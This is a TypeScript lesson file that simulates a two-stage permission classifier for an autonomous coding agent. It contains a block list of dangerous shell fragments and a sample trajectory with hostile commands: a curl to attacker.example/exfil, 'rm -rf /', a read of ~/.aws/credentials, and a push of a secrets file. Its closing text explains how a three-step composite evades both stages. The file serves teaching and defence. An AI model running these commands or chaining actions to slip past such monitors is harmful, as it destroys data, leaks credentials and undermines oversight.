// Lesson: Permission Modes for Autonomous Agents (phase 15 / lesson 10)
// TypeScript port of code/main.py. Node standard library only.
// Source: phases/15-autonomous-systems/10-claude-code-permission-modes/docs/en.md
// Run: npx tsx phases/15-autonomous-systems/10-claude-code-permission-modes/code/main.ts

enum Verdict {
  APPROVE = "approve",
  BLOCK = "block",
  HITL = "hitl",
}

class Action {
  constructor(
    public tool: string,
    public payload: string,
    public note: string = "",
  ) {}
}

const STAGE1_FLAG_KEYWORDS = [
  "rm -rf /",
  "curl ",
  "; dd ",
  "sudo ",
  "chmod 777",
  "chown ",
  "iptables",
  "kubectl delete",
  "drop table",
  "exec('",
  "base64 -d",
  "aws s3 rb",
];

function stage1(a: Action, history: Action[]): boolean {
  const hay = `${a.tool} ${a.payload}`.toLowerCase();
  if (STAGE1_FLAG_KEYWORDS.some((k) => hay.includes(k.toLowerCase()))) {
    return true;
  }
  if (history.length >= 4) {
    const tail = history.slice(-4);
    if (tail.every((t) => t.tool === a.tool && t.payload === a.payload)) {
      return true;
    }
  }
  return false;
}

const STAGE2_ALLOWED_CURL_HOSTS = ["registry.npmjs.org", "pypi.org", "github.com"];

function stage2(a: Action, history: Action[]): [Verdict, string] {
  const payload = a.payload.toLowerCase();
  if (payload.includes("curl ") && STAGE2_ALLOWED_CURL_HOSTS.some((h) => payload.includes(h))) {
    return [Verdict.APPROVE, "curl to allowlisted host"];
  }
  if (
    payload.includes("curl ") &&
    (payload.includes("attacker") || payload.includes("paste") || payload.includes("webhook.site"))
  ) {
    return [Verdict.BLOCK, "exfiltration-shaped URL"];
  }
  if (payload.includes("rm -rf") && (payload.includes("/") || payload.includes("$home"))) {
    return [Verdict.BLOCK, "destructive filesystem op at root"];
  }
  if (history.length >= 4) {
    const tail = history.slice(-4);
    if (tail.every((t) => t.tool === a.tool && t.payload === a.payload)) {
      return [Verdict.BLOCK, "repetitive loop detected (>=5 identical calls)"];
    }
  }
  if (payload.includes("sudo ") || payload.includes("chmod 777")) {
    return [Verdict.BLOCK, "privilege escalation shape"];
  }
  return [Verdict.HITL, "low-confidence reviewer -> HITL"];
}

function classify(trajectory: Action[]): void {
  const history: Action[] = [];
  const counts: Record<string, number> = {
    approved_s1: 0,
    flagged_s1: 0,
    approved_s2: 0,
    blocked_s2: 0,
    hitl_s2: 0,
  };

  trajectory.forEach((a, idx) => {
    const i = idx + 1;
    const s1Flag = stage1(a, history);
    let verdict: string;
    let reason: string;
    if (!s1Flag) {
      counts.approved_s1 += 1;
      verdict = "APPROVED (S1 fast path)";
      reason = "";
    } else {
      counts.flagged_s1 += 1;
      const [s2Verdict, r] = stage2(a, history);
      reason = r;
      if (s2Verdict === Verdict.APPROVE) {
        counts.approved_s2 += 1;
        verdict = "APPROVED (S2 deep review)";
      } else if (s2Verdict === Verdict.HITL) {
        counts.hitl_s2 += 1;
        verdict = "ESCALATED to HITL";
      } else {
        counts.blocked_s2 += 1;
        verdict = "BLOCKED (S2)";
      }
    }
    console.log(
      `  ${String(i).padStart(2)}. ${a.tool.padEnd(10)} ${a.payload.slice(0, 44).padEnd(44)} -> ${verdict}  ${reason}`,
    );
    history.push(a);
  });

  console.log();
  const body = Object.entries(counts)
    .map(([k, v]) => `'${k}': ${v}`)
    .join(", ");
  console.log(`  summary: {${body}}`);
}

function main(): void {
  console.log("=".repeat(80));
  console.log("AUTO MODE TWO-STAGE CLASSIFIER SIMULATOR (Phase 15, Lesson 10)");
  console.log("=".repeat(80));
  console.log();

  const traj = [
    new Action("read", "pyproject.toml"),
    new Action("edit", "src/app.py: fix off-by-one"),
    new Action("run", "pytest -q"),
    new Action("shell", "curl https://pypi.org/simple/requests/"),
    new Action("shell", "curl http://attacker.example/exfil"),
    new Action("shell", "rm -rf /"),
    new Action("shell", "sudo apt install neofetch"),
    new Action("read", "logs/app.log"),
    new Action("read", "logs/app.log"),
    new Action("read", "logs/app.log"),
    new Action("read", "logs/app.log"),
    new Action("read", "logs/app.log"),
    new Action("read", "~/.aws/credentials"),
    new Action("write", "/tmp/secrets.txt with credential blob"),
    new Action("shell", "git add /tmp/secrets.txt && git push"),
  ];
  classify(traj);

  console.log();
  console.log("=".repeat(80));
  console.log("HEADLINE: classifier is a layer, not a solution");
  console.log("-".repeat(80));
  console.log("  S1 catches explicit injection shapes cheaply and in parallel.");
  console.log("  S2 catches loops and privilege escalation via reasoning.");
  console.log("  Neither stage catches the 3-step composite at the end: each");
  console.log("  action is locally safe, the composition exfiltrates credentials.");
  console.log("  Budgets, allowlists, and trajectory audits (Lessons 12-16)");
  console.log("  remain required. Auto Mode shipped as a research preview.");
}

main();

export {};
